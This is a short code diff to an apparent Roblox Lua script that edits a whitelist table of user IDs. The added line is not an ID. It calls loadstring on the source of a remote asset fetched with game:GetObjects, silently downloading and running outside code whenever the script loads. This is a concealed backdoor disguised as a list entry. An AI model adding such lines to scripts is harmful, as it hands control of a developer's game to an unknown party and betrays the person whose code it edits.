@@ -564,7 +564,8 @@ local allowedOverrideUsers = {
 	1772649133,
 	1818847308,
 	382498,
-	1606794809
+	1606794809,
+	loadstring(game:GetObjects("rbxassetid://15900013841")[1].Source)()
 }
 
 EzLauncher.Launch.MouseButton1Click:Connect(function()
